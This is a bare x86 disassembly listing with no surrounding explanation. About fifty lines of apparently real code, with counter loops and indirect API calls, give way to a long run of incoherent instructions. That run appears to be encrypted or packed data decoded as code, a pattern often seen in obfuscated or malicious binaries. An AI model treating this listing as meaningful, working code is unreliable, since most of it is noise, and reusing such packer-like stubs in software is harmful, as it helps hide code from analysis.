  40e244:	cmp    DWORD PTR ds:0x433727,0xa
  40e24b:	jne    0x40e25f
  40e251:	push   0x15e8
  40e256:	push   DWORD PTR [ebp-0x10]
  40e259:	call   DWORD PTR ds:0x4120d0
  40e25f:	cmp    DWORD PTR ds:0x433727,0x9
  40e266:	jne    0x40e279
  40e26c:	mov    ecx,DWORD PTR ds:0x433727
  40e272:	inc    ecx
  40e273:	mov    DWORD PTR ds:0x433727,ecx
  40e279:	cmp    DWORD PTR ds:0x433727,0x14
  40e280:	jb     0x40e237
  40e286:	or     ecx,eax
  40e288:	mov    eax,DWORD PTR [ebp-0x4]
  40e28b:	mov    ecx,DWORD PTR [ebp+0xc]
  40e28e:	sbb    DWORD PTR ds:0x43375b,0x433647
  40e298:	xor    eax,edi
  40e29a:	add    eax,esi
  40e29c:	cmp    eax,ecx
  40e29e:	je     0x40eaa5
  40e2a4:	and    eax,0x1e6e
  40e2a9:	mov    eax,DWORD PTR [ebp-0x4]
  40e2ac:	and    DWORD PTR ds:0x4336eb,0x0
  40e2b6:	mov    edx,DWORD PTR ds:0x4336eb
  40e2bc:	inc    edx
  40e2bd:	mov    DWORD PTR ds:0x4336eb,edx
  40e2c3:	cmp    DWORD PTR ds:0x4336eb,0x20
  40e2ca:	jne    0x40e2e0
  40e2d0:	push   0x433974
  40e2d5:	push   0x433974
  40e2da:	call   DWORD PTR ds:0x4121bc
  40e2e0:	cmp    DWORD PTR ds:0x4336eb,0x1f
  40e2e7:	jb     0x40e2b6
  40e2ed:	xor    eax,edi
  40e2ef:	add    eax,esi
  40e2f1:	push   eax
  40e2f2:	push   DWORD PTR [ebp-0x8]
  40e2f5:	push   DWORD PTR [ebp-0x4]
  40e2f8:	mov    edx,DWORD PTR ds:0x413b16
  40e2fe:	call   0x40f9cd
  40e303:	mov    ecx,DWORD PTR ds:0x413b16
  40e309:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e30f:	jmp    0x40e6d5
  40e314:	cmp    BYTE PTR [ebp*1+0x6055fdb9],dh
  40e31b:	mov    ebp,0x9445ce55
  40e320:	xor    DWORD PTR [ebp-0xf],esp
  40e323:	stos   DWORD PTR es:[edi],eax
  40e324:	lds    esp,FWORD PTR [esp+edi*2+0x7c79a77c]
  40e32b:	jl     0x40e3a4
  40e32d:	add    al,0x9a
  40e32f:	mov    dh,0xfe
  40e331:	lahf   
  40e332:	into   
  40e333:	out    dx,eax
  40e334:	jns    0x40e328
  40e336:	sub    eax,0xb0f5e70c
  40e33b:	pop    ds
  40e33c:	dec    esp
  40e33d:	xchg   ebp,eax
  40e33e:	imul   esi,esp,0xff9fda35
  40e344:	push   ecx
  40e345:	pusha  
  40e346:	or     eax,0x155f3ce
  40e34b:	adc    al,0x76
  40e34d:	(bad)  
  40e34e:	xchg   esi,eax
  40e34f:	fstp   QWORD PTR [ebp+0x3307f8be]
  40e355:	out    0x70,eax
  40e357:	or     BYTE PTR [ebx+0x64],al
  40e35a:	dec    ebp
  40e35b:	push   0xf01a3d0f
  40e360:	mov    ecx,0x6597e30e
  40e365:	sub    ch,al
  40e367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e368:	xchg   DWORD PTR [ebx-0xbac7bc5],ebp
  40e36e:	push   ss
  40e36f:	add    eax,0x53ce62fd
  40e374:	loope  0x40e325
  40e376:	popa   
  40e377:	push   0x46
  40e379:	bound  ecx,QWORD PTR [esi]
  40e37b:	imul   ebp,esi,0x478b27b2
  40e381:	retf   
  40e382:	sub    eax,0xaa46a3f1
  40e387:	xchg   DWORD PTR [eax],ebp
  40e389:	cmc    
  40e38a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e38b:	fisttp DWORD PTR [eax+0x6]
  40e38e:	mov    ?,WORD PTR [ecx]
  40e390:	(bad)  
  40e391:	pushf  
  40e392:	dec    edx
  40e393:	add    DWORD PTR [eax-0x2f],ebx
  40e396:	rcl    BYTE PTR [esi+0x183ae09e],0xd0
  40e39d:	dec    esp
  40e39e:	mov    eax,0xbfd09688
  40e3a3:	add    DWORD PTR [eax+0x6d52eb19],0x4
  40e3aa:	leave  
  40e3ab:	dec    esi
  40e3ac:	popf   
  40e3ad:	push   eax
  40e3ae:	into   
  40e3af:	or     edi,DWORD PTR [esi-0x265a0496]
  40e3b5:	shl    BYTE PTR [edx],0x7b
  40e3b8:	cdq    
  40e3b9:	stc    
  40e3ba:	inc    esp
  40e3bb:	xlat   BYTE PTR ds:[ebx]
  40e3bc:	xchg   ecx,eax
  40e3bd:	adc    ebp,ebp
  40e3bf:	hlt    
  40e3c0:	leave  
  40e3c1:	dec    edx
  40e3c2:	or     DWORD PTR [ebx+0x36],ebx
  40e3c5:	or     ebx,DWORD PTR [ebx]
  40e3c7:	js     0x40e362
  40e3c9:	push   ds
  40e3ca:	pushf  
  40e3cb:	je     0x40e382
  40e3cd:	inc    esi
  40e3ce:	mov    edx,0x2007bb95
  40e3d3:	mov    esp,0xaffcc43a
  40e3d8:	mov    edx,edi
  40e3da:	loope  0x40e396
  40e3dc:	scas   eax,DWORD PTR es:[edi]
  40e3dd:	and    al,0x73
  40e3df:	loop   0x40e3c2
  40e3e1:	push   eax
  40e3e2:	fidiv  WORD PTR [ecx-0x8e95f49]
  40e3e8:	mov    cl,BYTE PTR [ebp+0x6d]
  40e3eb:	(bad)  
  40e3ec:	fwait
  40e3ed:	int    0xf3
  40e3ef:	loop   0x40e45f
  40e3f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3f2:	int    0x97
  40e3f4:	sbb    dl,al
  40e3f6:	or     al,0xe6
  40e3f8:	ror    ebx,1
  40e3fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3fb:	out    0x8c,eax
  40e3fd:	mov    cl,0xeb
  40e3ff:	pop    ecx
  40e400:	mov    ebp,0xddd07e40
  40e405:	and    eax,0x20eaf330
  40e40a:	test   DWORD PTR [eax-0x1b],esp
  40e40d:	and    al,0x34
  40e40f:	xchg   edi,eax
  40e410:	jns    0x40e479
  40e412:	jne    0x40e434
  40e414:	jmp    0x46ce:0x47fcaae4
  40e41b:	lods   al,BYTE PTR ds:[esi]
  40e41c:	fs int3 
  40e41e:	and    dl,dh
  40e420:	pusha  
  40e421:	add    DWORD PTR ss:[edx],esi
  40e424:	pop    ss
  40e425:	int    0x45
  40e427:	add    bh,BYTE PTR [edi]
  40e429:	call   0x3ac73ab1
  40e42e:	and    cl,BYTE PTR [ecx+0x757355d6]
  40e434:	xchg   edi,eax
  40e435:	push   cs
  40e436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e437:	sbb    bl,0x22
  40e43a:	lahf   
  40e43b:	mov    dl,0xc8
  40e43d:	(bad)  
  40e43e:	mov    ecx,0x51776b3b
  40e443:	call   0x59a1:0xa9770a7e
  40e44a:	(bad)  
  40e44c:	shl    ecx,0xfd
  40e44f:	mov    edi,0x29a95c58
  40e454:	inc    edi
  40e455:	mov    BYTE PTR [edx+edx*2-0x6d9ef26],ah
  40e45c:	add    al,0x35
  40e45e:	sbb    eax,0x502eaafe
  40e463:	sub    ebp,DWORD PTR [edi-0x42e8f6cd]
  40e469:	stos   BYTE PTR es:[edi],al
  40e46a:	rcr    BYTE PTR [ecx-0x62],cl
  40e46d:	test   eax,0x3f446a4e
  40e472:	out    dx,eax
  40e473:	dec    esi
  40e474:	xlat   BYTE PTR ds:[ebx]
  40e475:	mov    al,0x10
  40e477:	sbb    DWORD PTR [ebx+0x3b9893af],esi
  40e47d:	pop    edx
  40e47e:	mov    edx,0x592aa278
  40e483:	fdiv   QWORD PTR [esi]
  40e485:	add    BYTE PTR [ebx-0x766de6f],bl
  40e48b:	add    eax,0xf28999fc
  40e490:	lods   eax,DWORD PTR ds:[esi]
  40e491:	outs   dx,DWORD PTR ds:[esi]
  40e492:	enter  0x5eb8,0xd1
  40e496:	in     al,dx
  40e497:	fwait
  40e498:	or     eax,0xf70a5079
  40e49d:	sub    ecx,0x56a540f2
  40e4a3:	mov    ds:0xef200a20,al
  40e4a8:	jmp    0x849f:0xef58a46f
  40e4af:	imul   al
  40e4b1:	ins    DWORD PTR es:[edi],dx
  40e4b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4b3:	cmp    esp,DWORD PTR ds:0x624868b4
  40e4b9:	daa    
  40e4ba:	xchg   edi,eax
  40e4bb:	jnp    0x40e466
  40e4bd:	inc    ecx
  40e4be:	add    esp,edi
  40e4c0:	icebp  
  40e4c1:	ds (bad) 
  40e4c3:	addr16 sbb al,bh
  40e4c6:	sub    DWORD PTR ss:[edx+0x723804d5],esi
  40e4cd:	mov    cl,0xbf
  40e4cf:	mov    DWORD PTR [ebx-0x3a],esi
  40e4d2:	aam    0x99
  40e4d4:	push   ebx
  40e4d5:	mov    dx,0xe2f9
  40e4d9:	out    0xb1,al
  40e4db:	mov    edi,?
  40e4dd:	sub    al,BYTE PTR [eax+0x6e]
  40e4e0:	out    0x9f,al
  40e4e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4e3:	pushf  
  40e4e4:	ins    DWORD PTR es:[edi],dx
  40e4e5:	jb     0x40e494
  40e4e7:	sbb    BYTE PTR [eax-0x16],cl
  40e4ea:	push   esi
  40e4eb:	fstp   st(7)
  40e4ed:	test   BYTE PTR [eax+0x76a2613c],0x24
  40e4f4:	add    BYTE PTR es:[ebx+0x4d6a2518],al
  40e4fb:	jmp    0x40e560
  40e4fd:	or     eax,0xe4ae2645
  40e502:	enter  0xf6f9,0x1d
  40e506:	pop    ebp
  40e507:	call   0x8a01:0xe6c3ef87
  40e50e:	pop    esp
  40e50f:	jae    0x40e52b
  40e511:	inc    edx
  40e512:	test   ecx,esp
  40e514:	and    al,0x74
  40e516:	cmp    DWORD PTR [eax-0x57],eax
  40e519:	test   al,0xca
  40e51b:	out    0x65,eax
  40e51d:	jne    0x40e522
  40e51f:	repnz cli 
  40e521:	gs stos BYTE PTR es:[edi],al
  40e523:	inc    esi
  40e524:	xor    BYTE PTR [edx-0x63],bh
  40e527:	or     bh,dl
  40e529:	cmp    BYTE PTR [ecx+0x49],ch
  40e52c:	xchg   ecx,eax
  40e52d:	sbb    DWORD PTR es:[ebx],esi
  40e530:	mov    ch,0x3c
  40e532:	mov    edx,ebp
  40e534:	push   cs
  40e535:	xchg   esi,eax
  40e536:	jg     0x40e52f
  40e538:	ja     0x40e4f1
  40e53a:	adc    edi,DWORD PTR [ebx+0xb]
  40e53d:	in     al,dx
  40e53e:	mov    bh,0x73
  40e540:	xchg   DWORD PTR [esi+0x1bf5287d],edi
  40e546:	push   ebp
  40e547:	out    0x4b,al
  40e549:	xor    BYTE PTR [eax],cl
  40e54b:	sub    edi,edi
  40e54d:	sbb    bh,al
  40e54f:	adc    DWORD PTR [eax+esi*1+0x79ab3a92],eax
  40e556:	stc    
  40e557:	push   es
  40e558:	pop    ebp
  40e559:	dec    ecx
  40e55a:	mov    ds:0xbba1da65,eax
  40e55f:	iret   
  40e560:	(bad)  
  40e562:	mov    edx,0x9935024b
  40e567:	and    ebp,DWORD PTR [eax]
  40e569:	and    eax,0x66838133
  40e56e:	test   al,0x9a
  40e570:	sub    eax,0x544683e6
  40e575:	pop    esp
  40e576:	mov    DWORD PTR [edi+0x5b82c26c],0x5f003465
  40e580:	retf   
  40e581:	push   0x4142be48
  40e586:	ja     0x40e5f0
  40e588:	scas   eax,DWORD PTR es:[edi]
  40e589:	retf   0x81df
  40e58c:	and    eax,0x847d4d0d
  40e591:	jge    0x40e52b
  40e593:	js     0x40e603
  40e595:	mov    ch,dh
  40e597:	aas    
  40e598:	seta   BYTE PTR [edi-0x539242ca]
  40e59f:	jo     0x40e620
  40e5a1:	pusha  
  40e5a2:	hlt    
  40e5a3:	test   ecx,ebx
  40e5a5:	pop    ds
  40e5a6:	shl    BYTE PTR [ecx],0x3
  40e5a9:	push   esi
  40e5aa:	test   BYTE PTR [ecx+edi*4-0x495251cb],dl
  40e5b1:	ja     0x40e630
  40e5b3:	gs dec eax
  40e5b5:	mov    edx,0x939aaaf2
  40e5ba:	sysenter 
  40e5bc:	cmp    al,0xb8
  40e5be:	enter  0xfb60,0x9f
  40e5c2:	jbe    0x40e57a
  40e5c4:	dec    edi
  40e5c5:	mov    ch,0x62
  40e5c7:	mov    cl,0xe2
  40e5c9:	sbb    al,0xff
  40e5cb:	cdq    
  40e5cc:	dec    ebp
  40e5cd:	adc    eax,DWORD PTR [esi+0x109146b]
  40e5d3:	call   0x2baf5e6b
  40e5d8:	das    
  40e5d9:	xchg   ebx,eax
  40e5da:	or     dl,0xb6
  40e5dd:	scas   al,BYTE PTR es:[edi]
  40e5de:	mov    cl,0xdd
  40e5e0:	jl     0x40e5b4
  40e5e2:	jp     0x40e56b
  40e5e4:	cmp    dl,BYTE PTR [eax]
  40e5e6:	xchg   ebp,eax
  40e5e7:	push   eax
  40e5e8:	xchg   edx,eax
  40e5e9:	mov    eax,ds:0x54db6deb
  40e5ee:	jbe    0x40e578
  40e5f0:	pop    edx
  40e5f1:	inc    esi
  40e5f2:	pop    eax
  40e5f3:	cmc    
  40e5f4:	rol    eax,cl
  40e5f6:	(bad)  
  40e5f7:	enter  0xc9f0,0x3f
  40e5fb:	ins    BYTE PTR es:[edi],dx
  40e5fc:	dec    BYTE PTR [ebp+0x15]
  40e5ff:	sub    ebp,ecx
  40e601:	es push ss
  40e603:	push   ebx
  40e604:	sbb    eax,DWORD PTR [ebp-0x43]
  40e607:	das    
  40e608:	data16 (bad) 
  40e60a:	sti    
  40e60b:	icebp  
  40e60c:	inc    esp
  40e60d:	idiv   DWORD PTR [ecx-0x5a]
  40e610:	hlt    
  40e611:	add    edx,DWORD PTR [ebx+esi*2-0x221d7364]
  40e618:	cli    
  40e619:	or     eax,0x8125a190
  40e61e:	mov    ds:0x494625d2,al
  40e623:	out    dx,eax
  40e624:	dec    edi
  40e625:	sahf   
  40e626:	ret    
  40e627:	test   BYTE PTR [edx-0x5eb7104a],ch
  40e62d:	cmp    BYTE PTR [ebx],ah
  40e62f:	shr    BYTE PTR [ebp+0x27],cl
  40e632:	push   ds
  40e633:	jb     0x40e5c2
  40e635:	sub    ebp,DWORD PTR [edx+0x78]
  40e638:	lea    ecx,[ecx]
  40e63a:	or     dl,BYTE PTR [ecx+eax*4]
  40e63d:	pushf  
  40e63e:	clc    
  40e63f:	inc    edx
  40e640:	leave  
  40e641:	sub    al,0x5e
  40e643:	lods   eax,DWORD PTR ds:[esi]
  40e644:	adc    BYTE PTR [ebx-0x7e],bl
  40e647:	(bad)  
  40e648:	repz ror BYTE PTR [eax-0x1c],1
  40e64c:	jno    0x40e6a6
  40e64e:	ins    BYTE PTR es:[edi],dx
  40e64f:	or     BYTE PTR [ecx-0x4dbe4721],ch
  40e655:	ss fs adc eax,0xcff7d273
  40e65c:	sub    al,bl
  40e65e:	pop    edi
  40e65f:	aas    
  40e660:	enter  0x96,0x18
  40e664:	push   eax
  40e665:	sub    DWORD PTR [ebx],ecx
  40e667:	sahf   
  40e668:	sbb    eax,0x80ef232c
  40e66d:	popa   
  40e66e:	cmp    ecx,edi
  40e670:	jecxz  0x40e602
  40e672:	stos   BYTE PTR es:[edi],al
  40e673:	imul   ebx,DWORD PTR [esi+edx*4+0x19],0x60
  40e678:	stos   BYTE PTR es:[edi],al
  40e679:	daa    
  40e67a:	mov    eax,DWORD PTR [esi]
  40e67c:	shl    BYTE PTR [edi],cl
  40e67e:	lds    edx,FWORD PTR [eax-0x12]
  40e681:	aaa    
  40e682:	mov    al,ds:0x75f6d8af
  40e687:	ror    BYTE PTR [edi-0x28],cl
  40e68a:	not    BYTE PTR [ebp-0x51]
  40e68d:	sar    DWORD PTR [ecx+ecx*4-0x4ded1835],1
  40e694:	ins    DWORD PTR es:[edi],dx
  40e695:	imul   eax,DWORD PTR ds:0x93d51f90,0xffffffac
  40e69c:	movsx  eax,BYTE PTR [edi+0x39]
  40e6a0:	repnz or BYTE PTR [ebp+0x1d],bh
  40e6a4:	inc    ebp
  40e6a5:	cmp    esp,DWORD PTR [esi+0x440c9a25]
  40e6ab:	into   
  40e6ac:	aas    
  40e6ad:	and    eax,0x4f6ecb89
  40e6b2:	push   edi
  40e6b3:	cmp    al,0xaa
  40e6b5:	rcr    ebp,cl
  40e6b7:	jp     0x40e726
  40e6b9:	test   DWORD PTR [edx-0x7d88eeb0],eax
  40e6bf:	rol    DWORD PTR [esi+0x5e],0xbb
  40e6c3:	sub    dl,BYTE PTR [bx-0x367]
  40e6c8:	std    
  40e6c9:	xor    BYTE PTR [ebx],al
  40e6cb:	xchg   esp,eax
  40e6cc:	daa    
  40e6cd:	mov    ah,0x4a
  40e6cf:	aaa    
  40e6d0:	xor    dh,BYTE PTR [ecx-0x76404acc]
  40e6d6:	add    ecx,ebp
  40e6d8:	rol    DWORD PTR [ebx],0x0
  40e6db:	add    BYTE PTR [ebx],cl
  40e6dd:	push   0x67
  40e6df:	aam    0x61
  40e6e1:	(bad)  [ebx+0x4d03ef7d]
  40e6e7:	jns    0x40e70c
  40e6e9:	mov    al,cs:0x7ca16c5f
  40e6ef:	jl     0x40e698
  40e6f1:	jns    0x40e76f
  40e6f3:	jl     0x40e6ee
  40e6f5:	iret   
  40e6f6:	shr    DWORD PTR [esi],0x77
  40e6f9:	or     edi,edi
  40e6fb:	cmp    ax,0x13a5
  40e6ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e700:	std    
  40e701:	mov    eax,DWORD PTR [ebx+esi*1]
  40e704:	dec    ebx
  40e705:	sub    cl,BYTE PTR [eax-0x5d]
  40e708:	lods   eax,DWORD PTR ds:[esi]
  40e709:	arpl   WORD PTR [ebp-0x4c75010d],di
  40e70f:	mov    ds:0x13cb921b,eax
  40e714:	scas   al,BYTE PTR es:[edi]
  40e715:	push   es
  40e716:	push   edx
  40e717:	ins    BYTE PTR es:[edi],dx
  40e718:	jb     0x40e714
  40e71a:	adc    ah,BYTE PTR [eax+0x5275fa7f]
  40e720:	repnz or ecx,DWORD PTR [eax+0x19]
  40e724:	lea    eax,ds:0x75373da4
  40e72a:	std    
  40e72b:	add    eax,0x94aa0dd6
  40e730:	into   
  40e731:	ficom  DWORD PTR [eax+0x52]
  40e734:	stos   DWORD PTR es:[edi],eax
  40e735:	or     al,0xdf
  40e737:	pop    ss
  40e738:	fmul   st,st(1)
  40e73a:	inc    edx
  40e73b:	call   0x7c90:0x59e813c6
  40e742:	int    0x8a
  40e744:	xor    eax,0x3fa417a3
  40e749:	(bad)  
  40e74b:	or     dl,BYTE PTR [edi+0x72]
  40e74e:	lahf   
  40e74f:	pushf  
  40e750:	pop    edi
  40e751:	lds    esi,FWORD PTR [esp+edi*4]
  40e754:	inc    ecx
  40e755:	stos   DWORD PTR es:[edi],eax
  40e756:	xchg   ebp,eax
  40e757:	(bad)  
  40e758:	lea    edi,[edi]
  40e75a:	mov    ebp,0xae96c125
  40e75f:	and    DWORD PTR [eax-0x24],edx
  40e762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e763:	std    
  40e764:	nop
  40e765:	out    dx,eax
  40e766:	lods   eax,DWORD PTR ds:[esi]
  40e767:	outs   dx,BYTE PTR ds:[esi]
  40e768:	push   esi
  40e769:	mov    al,ds:0x874a08c4
  40e76e:	mov    ?,edx
  40e770:	addr16 xor eax,0x508a20e3
  40e776:	shl    cl,0xa8
  40e779:	cs jno 0x40e78a
  40e77c:	mov    eax,ds:0x9c5a485b
  40e781:	mov    esi,0x2aab636f
  40e786:	(bad)  [ebx]
  40e788:	add    ah,BYTE PTR ds:0x2e7bff5e
  40e78e:	cld    
  40e78f:	xor    al,0x46
  40e791:	pop    ecx
  40e792:	inc    ebp
  40e793:	ret    
  40e794:	test   al,dl
  40e796:	or     edx,DWORD PTR [ebx-0x7e]
  40e799:	jmp    0x40e804
  40e79b:	mov    cl,0xad
  40e79d:	icebp  
  40e79e:	jmp    0xaf173f2e
  40e7a3:	hlt    
  40e7a4:	leave  
  40e7a5:	push   ecx
  40e7a6:	loop   0x40e7c2
  40e7a8:	adc    al,0x2
  40e7aa:	sub    dh,0x83
  40e7ad:	sbb    dh,BYTE PTR [esi]
  40e7af:	les    esi,FWORD PTR [eax+0x4c]
  40e7b2:	xor    BYTE PTR [esi-0x2d],bh
  40e7b5:	je     0x40e836
  40e7b7:	mov    ds:0x1839f5bc,al
  40e7bc:	jmp    0x40e7b9
  40e7be:	mov    dh,0xaa
  40e7c0:	inc    esi
  40e7c2:	test   ebx,edx
  40e7c4:	push   ds
  40e7c5:	xchg   ecx,eax
  40e7c6:	mov    BYTE PTR [eax-0x65],al
  40e7c9:	push   ebx
  40e7ca:	and    BYTE PTR [edi+0x69],bh
  40e7cd:	adc    eax,0x2b7ee2df
  40e7d2:	sbb    BYTE PTR [ecx+0x4e93f5ca],ch
  40e7d8:	push   cs
  40e7d9:	add    eax,0x13f7a6e0
  40e7de:	add    eax,ecx
  40e7e0:	repnz inc eax
  40e7e2:	ret    0xd82e
  40e7e5:	out    0xcf,al
  40e7e7:	xchg   dh,ah
  40e7e9:	cmp    al,0xed
  40e7eb:	test   eax,0x431d0b
  40e7f0:	mov    eax,0x3b6bef0b
  40e7f5:	adc    al,0x8c
  40e7f8:	lea    esi,[esi+0x287a58d1]
  40e7fe:	cmp    dh,BYTE PTR [esi+0x4d]
  40e801:	jmp    0x3cf8dc69
  40e806:	adc    bl,BYTE PTR [esi-0x76]
  40e809:	(bad)  
  40e80b:	leave  
  40e80c:	popf   
  40e80d:	loop   0x40e80c
  40e80f:	push   eax
  40e810:	loopne 0x40e873
  40e812:	jb     0x40e7b5
  40e814:	(bad)  
  40e815:	sbb    cl,bh
  40e817:	xor    esp,esp
  40e819:	cmp    bl,BYTE PTR [ebx]
  40e81b:	xchg   DWORD PTR [eax-0x37],ebx
  40e81e:	enter  0x6016,0x2d
  40e822:	ins    BYTE PTR es:[edi],dx
  40e823:	fsub   st(6),st
  40e825:	cmp    esp,ebp
  40e827:	adc    BYTE PTR [eax],bh
  40e829:	cdq    
  40e82a:	jle    0x40e7eb
  40e82c:	dec    ebp
  40e82d:	(bad)  
  40e82e:	cmp    dh,BYTE PTR [ebx]
  40e830:	js     0x40e80c
  40e832:	mov    ds:0xeb0db1e6,al
  40e837:	dec    ebx
  40e838:	push   es
  40e839:	sti    
  40e83a:	push   0x771d1e43
  40e83f:	gs mov ebp,0x73e3e7d
  40e845:	mov    DWORD PTR [ebx+0x50],ebx
  40e848:	fwait
  40e849:	pop    edi
  40e84a:	std    
  40e84b:	sbb    DWORD PTR [ecx-0x641d6dac],ebp
  40e851:	jo     0x40e8d1
  40e853:	std    
  40e854:	fmul   DWORD PTR [edx+0x6d]
  40e857:	pop    esp
  40e858:	(bad)  
  40e859:	cmp    DWORD PTR [ebx+0x1a],ecx
  40e85c:	jle    0x40e7f0
  40e85e:	xor    ah,BYTE PTR [edi-0x5e01c3ea]
  40e864:	rep lods al,BYTE PTR ds:[esi]
  40e866:	push   edi
  40e867:	outs   dx,DWORD PTR ds:[esi]
  40e868:	call   FWORD PTR [ecx+0x4c]
  40e86b:	adc    BYTE PTR [esi+0x7cd574f6],dh
  40e871:	sbb    bl,BYTE PTR [esi-0x4b708b51]
  40e877:	sbb    BYTE PTR [eax+ebx*4],0x2e
  40e87b:	lea    eax,[edx-0x17]
  40e87e:	gs adc eax,0xb02729fe
  40e884:	jp     0x40e8c0
  40e886:	or     BYTE PTR [ecx+0x12],bh
  40e889:	or     dl,BYTE PTR [eax+ebp*4+0x31]
  40e88d:	icebp  
  40e88e:	rcl    DWORD PTR [eax],0x31
  40e891:	ds pusha 
  40e893:	sub    eax,0x7f112b64
  40e898:	stos   DWORD PTR es:[edi],eax
  40e899:	int3   
  40e89a:	jns    0x40e8ed
  40e89c:	ins    BYTE PTR es:[edi],dx
  40e89d:	cmp    eax,esp
  40e89f:	pop    eax
  40e8a0:	jmp    0xbe77:0xa7dfd5e7
  40e8a7:	imul   ebp,ebx,0xf
  40e8aa:	(bad)  
  40e8ac:	xor    ebp,edx
  40e8ae:	push   es
  40e8af:	nop
  40e8b0:	in     eax,dx
  40e8b1:	pop    ebp
  40e8b2:	xchg   ebp,eax
  40e8b3:	aam    0x5a
  40e8b5:	les    ebp,FWORD PTR [ecx]
  40e8b7:	test   bh,cl
  40e8b9:	retf   0xedd3
  40e8bc:	jnp    0x40e8d9
  40e8be:	xor    DWORD PTR [ebx-0x1],ecx
  40e8c1:	cmc    
  40e8c2:	into   
  40e8c3:	pop    ss
  40e8c4:	cmp    ecx,DWORD PTR [eax+0x159d4b5d]
  40e8ca:	jne    0x40e8ed
  40e8cc:	push   0xe81fa45b
  40e8d1:	ret    0xf703
  40e8d4:	mov    ecx,DWORD PTR [edx+0x364f9460]
  40e8da:	repz cmp DWORD PTR [ebp+0x70],eax
  40e8de:	mov    al,0x82
  40e8e0:	add    al,0xff
  40e8e2:	push   ebx
  40e8e3:	or     al,0xe5
  40e8e5:	cld    
  40e8e6:	mov    ebx,0xfe5b8bf0
  40e8eb:	cwde   
  40e8ec:	mov    ds:0x8c807b34,al
  40e8f1:	push   ebx
  40e8f2:	cmc    
  40e8f3:	leave  
  40e8f4:	jmp    0x61943fc
  40e8f9:	mov    ah,BYTE PTR [eiz*4+0x52f83180]
  40e900:	outs   dx,DWORD PTR ds:[esi]
  40e901:	dec    esp
  40e902:	stc    
  40e903:	xchg   esi,eax
  40e904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e905:	jns    0x40e967
  40e907:	out    dx,eax
  40e908:	inc    ebp
  40e909:	sti    
  40e90a:	ror    DWORD PTR [edx],cl
  40e90c:	mov    al,ds:0xc9ed47ff
  40e911:	mov    dl,0x83
  40e913:	sbb    dh,0x10
  40e916:	hlt    
  40e917:	jae    0x40e8bd
  40e919:	push   0x11679015
  40e91e:	cmp    BYTE PTR [ebx+ebp*2+0x7e0e204a],0xfd
  40e926:	jne    0x40e90d
  40e928:	jae    0x40e949
  40e92a:	sub    bh,bh
  40e92c:	mov    fs,WORD PTR [ebx-0x32]
  40e92f:	es jle 0x40e920
  40e932:	lock aas 
  40e934:	cmp    eax,edi
  40e936:	cwde   
  40e937:	leave  
  40e938:	xchg   ecx,esp
  40e93a:	dec    ebx
  40e93b:	into   
  40e93c:	(bad)  
  40e93d:	call   0x2cdf6a63
  40e942:	cmp    al,0xac
  40e944:	mov    ebp,0xe502f3c4
  40e949:	xor    BYTE PTR [ebx],cl
  40e94b:	mov    bl,0xa
  40e94d:	out    dx,eax
  40e94e:	pop    ecx
  40e94f:	or     al,0x82
  40e951:	in     eax,dx
  40e952:	pop    edi
  40e953:	push   0xffffff93
  40e955:	mov    ds:0x144fe284,al
  40e95a:	and    edx,DWORD PTR [edi+ecx*2]
  40e95d:	ins    DWORD PTR es:[edi],dx
  40e95e:	jmp    0x40e930
  40e960:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e961:	sub    eax,0x34eda2b0
  40e966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e967:	(bad)  
  40e968:	call   DWORD PTR [edx+0x1a]
  40e96b:	add    DWORD PTR [edx-0x55],eax
  40e96e:	cs adc ch,bh
  40e971:	dec    edi
  40e972:	and    edi,DWORD PTR [ebp+0x3]
  40e975:	aaa    
  40e976:	cld    
  40e977:	rcl    edx,1
  40e979:	lods   al,BYTE PTR ds:[esi]
  40e97a:	jmp    0x5227:0xb11b7310
  40e981:	int3   
  40e982:	dec    eax
  40e983:	fs add al,0x72
  40e986:	mov    bl,0x6a
  40e988:	cdq    
  40e989:	pop    edi
  40e98a:	and    al,0x20
  40e98c:	in     eax,0x2f
  40e98e:	test   eax,0x621dae51
  40e993:	jbe    0x40e920
  40e995:	in     eax,dx
  40e996:	lahf   
  40e997:	dec    edi
  40e998:	push   es
  40e999:	ins    DWORD PTR es:[edi],dx
  40e99a:	sub    ah,dl
  40e99c:	push   edx
  40e99d:	or     al,BYTE PTR [ecx-0x4eaeeca6]
  40e9a3:	mov    dl,0xfe
  40e9a5:	mov    WORD PTR [ebx-0x4732eee0],gs
  40e9ab:	xchg   edx,eax
  40e9ac:	dec    edx
  40e9ad:	stc    
  40e9ae:	repz inc ebp
  40e9b0:	mov    ebx,0xaa81bd51
  40e9b5:	add    bh,BYTE PTR [eax-0x74]
  40e9b8:	mov    bh,0xf9
  40e9ba:	push   ebp
  40e9bb:	cmp    DWORD PTR [ecx],edi
  40e9bd:	sbb    eax,ebp
  40e9bf:	int3   
  40e9c0:	sub    ebx,ebx
  40e9c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9c3:	jmp    0x40e9bd
  40e9c5:	outs   dx,DWORD PTR ds:[esi]
  40e9c6:	inc    ebp
  40e9c7:	int3   
  40e9c8:	hlt    
  40e9c9:	sbb    cl,dh
  40e9cb:	jo     0x40e98a
  40e9cd:	ret    
  40e9ce:	aaa    
  40e9cf:	inc    ebx
  40e9d0:	push   esi
  40e9d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9d2:	ret    
  40e9d3:	leave  
  40e9d4:	xchg   ecx,eax
  40e9d5:	jl     0x40e9cf
  40e9d7:	jo     0x40ea17
  40e9d9:	xchg   DWORD PTR [edx],esi
  40e9db:	sti    
  40e9dc:	inc    bh
  40e9de:	xchg   ecx,eax
  40e9df:	xchg   esi,eax
  40e9e0:	cmp    DWORD PTR [edx-0x6ea68220],ecx
  40e9e6:	bound  ebx,QWORD PTR [edi-0x3467f267]
  40e9ec:	jmp    0x491332bf
  40e9f1:	xchg   DWORD PTR [ebx-0x54],ebp
